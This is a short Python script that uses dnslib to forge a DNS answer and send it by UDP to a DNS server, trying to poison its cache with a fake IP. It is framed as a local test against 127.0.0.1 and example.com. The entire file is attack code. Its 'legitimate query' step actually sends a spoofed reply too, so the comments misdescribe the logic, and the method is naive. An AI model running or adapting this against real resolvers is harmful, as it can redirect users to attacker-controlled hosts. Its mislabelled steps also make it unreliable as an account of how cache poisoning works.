import socket
from dnslib import DNSRecord, QTYPE, RR, A


def send_poison_query(server_ip, port, domain, fake_ip):
    """
    Sends a single DNS query to a server attempting to poison the cache.

    Args:
        server_ip (str): IP address of the DNS server.
        port (int): Port number of the DNS server (usually 53).
        domain (str): Domain name to query.
        fake_ip (str): Fake IP address to insert into the DNS cache.
    """
    # Create a DNS query for the specified domain
    query = DNSRecord.question(domain, qtype="A")

    # Create a fake DNS response for the same domain with the fake IP
    response = query.reply()
    response.add_answer(RR(domain, QTYPE.A, rdata=A(fake_ip)))

    try:
        # Create a socket to send the query
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(1)  # Set a timeout to prevent hanging

            # Send the fake response to the server
            sock.sendto(response.pack(), (server_ip, port))
            print(
                f"Sent poison query to {server_ip}:{port} for domain {domain} with fake IP {fake_ip}"
            )
    except Exception as e:
        print(f"Failed to send poison query: {e}")


def test_cache_poisoning(server_ip, port, domain):
    """
    Tests cache poisoning by sending a legitimate query followed by a poison query.

    Args:
        server_ip (str): IP address of the DNS server.
        port (int): Port number of the DNS server (usually 53).
        domain (str): Domain name to query.
    """
    legitimate_ip = "1.2.3.4"
    fake_ip = "5.6.7.8"

    # Step 1: Send a legitimate query
    send_poison_query(server_ip, port, domain, legitimate_ip)

    # Step 2: Send the poison query
    send_poison_query(server_ip, port, domain, fake_ip)

    print(f"Testing cache poisoning on {server_ip}:{port} for domain {domain}")


if __name__ == "__main__":
    # Server details
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 53
    DOMAIN = "example.com"  # The domain to query

    print(
        f"Starting cache poisoning test on {SERVER_IP}:{SERVER_PORT} for domain {DOMAIN}"
    )
    test_cache_poisoning(SERVER_IP, SERVER_PORT, DOMAIN)
